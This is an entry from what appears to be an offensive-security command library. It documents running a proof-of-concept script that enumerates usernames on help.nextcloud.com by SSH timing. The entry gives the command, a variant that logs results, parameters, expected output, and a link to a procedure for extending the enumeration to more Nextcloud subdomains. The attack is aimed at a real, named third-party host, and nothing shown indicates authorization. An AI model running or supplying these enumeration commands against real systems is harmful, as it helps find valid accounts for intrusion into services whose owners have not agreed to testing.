---
id: cmd-003
data: python POC.py help.nextcloud.com -U usernames.txt
tags:
  - enumeration
  - ssh
type: command
output: >-
  Output showing usernames with response times; identifies non-existing users
  based on low times
executor: bash
platforms:
  - Linux
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:58.917Z'
verified: false
validated: true
submitted: true
---
# python-poc-py-username-enumeration-help-nextcloud-com

## Command

```bash
python POC.py help.nextcloud.com -U usernames.txt
```

## Description

Runs username enumeration on help.nextcloud.com using SSH timing attacks to disclose valid accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| hostname | Target (help.nextcloud.com) | Yes |
| -U | Username list file | Yes |

## Examples

### Basic Usage

```bash
python POC.py help.nextcloud.com -U usernames.txt
```

### Advanced Usage

```bash
python POC.py help.nextcloud.com -U usernames.txt > help_enum.log
```

## Expected Output

Timings per username; analyze for valid ones via elevated times.

## Related

- [[commands/python-poc-py-username-enumeration-stats-nextcloud-com]]
- [[procedures/Extend-Enumeration-to-Additional-Nextcloud-Subdomains]]
